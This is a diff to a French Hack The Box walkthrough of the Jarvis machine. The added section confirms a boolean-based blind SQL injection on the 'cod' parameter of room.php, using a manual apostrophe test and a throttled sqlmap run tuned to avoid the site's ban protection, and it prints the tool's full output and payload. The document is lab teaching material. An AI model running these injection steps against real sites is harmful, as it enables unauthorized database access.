@@ -574,6 +574,8 @@ http://jarvis.htb/room.php?cod=2
 
 Avec cette valeur, l’application affiche correctement les informations de la chambre numéro `2`.
 
+![](jarvis-room-code-2.png)
+
 Avant d’utiliser un outil automatisé, tu modifies manuellement ce paramètre afin d’observer la manière dont il est traité par l’application.
 
 Tu ajoutes d’abord une apostrophe après la valeur numérique :
@@ -583,6 +585,8 @@ http://jarvis.htb/room.php?cod=2'
 ```
 
 Cette fois, la page ne retourne plus les informations de la chambre. 
+
+![](jarvis-room-code-2-apostrophe.png)
 
 Ce comportement laisse penser que l’apostrophe perturbe la syntaxe d’une requête SQL construite à partir de la valeur de `cod`.
 
@@ -631,6 +635,107 @@ Le résultat de la condition injectée influence donc directement la réponse du
 La prochaine étape consiste à utiliser `sqlmap` afin de confirmer automatiquement la vulnérabilité et d’en déterminer plus précisément les caractéristiques.
 
 #### Confirmation de l’injection avec sqlmap
+
+Les vérifications manuelles montrent que le contenu retourné par l’application dépend du résultat vrai ou faux de la condition ajoutée au paramètre `cod`. 
+
+Tu utilises maintenant `sqlmap` afin de confirmer automatiquement cette vulnérabilité. Comme l’énumération a révélé la présence de phpMyAdmin, tu peux raisonnablement orienter l’outil vers un environnement MySQL. 
+
+Tu limites également les tests à la technique booléenne déjà observée, tout en réduisant la fréquence des requêtes afin de ne pas déclencher trop rapidement le mécanisme de protection du site :
+
+```bash
+sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --level=1 \
+  --risk=1 \
+  --threads=1 \
+  --delay=1 \
+  --batch \
+  --flush-session
+```
+
+L’option `-p cod` demande à `sqlmap` de tester uniquement le paramètre `cod`.
+
+L’option `--dbms=MySQL` limite les charges utiles à celles compatibles avec MySQL, tandis que `--technique=B` restreint la recherche aux injections SQL booléennes.
+
+Les options `--level=1` et `--risk=1` conservent les niveaux de test les plus prudents afin de limiter le nombre de requêtes envoyées.
+
+Les options `--threads=1` et `--delay=1` imposent l’utilisation d’un seul thread et ajoutent une seconde d’attente entre les requêtes. Elles permettent ainsi de réduire le risque de bannissement par le mécanisme de protection détecté pendant l’énumération.
+
+L’option `--batch` accepte automatiquement les réponses par défaut proposées par `sqlmap`.
+
+Enfin, `--flush-session` efface les résultats précédemment enregistrés par l’outil pour forcer une nouvelle détection.
+
+Voici le résultat de cette exécution :
+
+```bash
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.10.6#stable}
+|_ -| . [,]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ [15:32:54 /date]/
+
+[15:32:55] [INFO] flushing session file
+[15:32:55] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=7b19b566d6d...4fp1sjs8l1'). Do you want to use those [Y/n] Y
+[15:32:56] [INFO] checking if the target is protected by some kind of WAF/IPS
+[15:32:57] [INFO] testing if the target URL content is stable
+[15:32:58] [INFO] target URL content is stable
+[15:32:59] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
+[15:33:00] [INFO] testing for SQL injection on GET parameter 'cod'
+[15:33:00] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[15:33:05] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Suite room is perfect")
+[15:33:05] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
+GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 5607=5607
+---
+[15:33:13] [INFO] testing MySQL
+[15:33:14] [INFO] confirming MySQL
+[15:33:18] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[15:33:19] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 15:33:19 /date/
+```
+
+Cette fois, l’outil confirme que le paramètre GET `cod` est vulnérable :
+
+```txt
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 5607=5607
+```
+
+La charge utile générée ajoute une condition toujours vraie :
+
+```txt
+5607=5607
+```
+
+L’application continue alors de retourner les informations de la chambre, ce qui permet à `sqlmap` de distinguer une réponse vraie d’une réponse fausse.
+
+L’outil identifie également le système de gestion de base de données utilisé :
+
+```txt
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+```
+
+L’injection SQL du paramètre `cod` est donc confirmée. Il s’agit d’une injection de type **boolean-based blind** sur un serveur MySQL utilisant un fork MariaDB.
 
 #### Identification du type d’injection et du SGBD
 
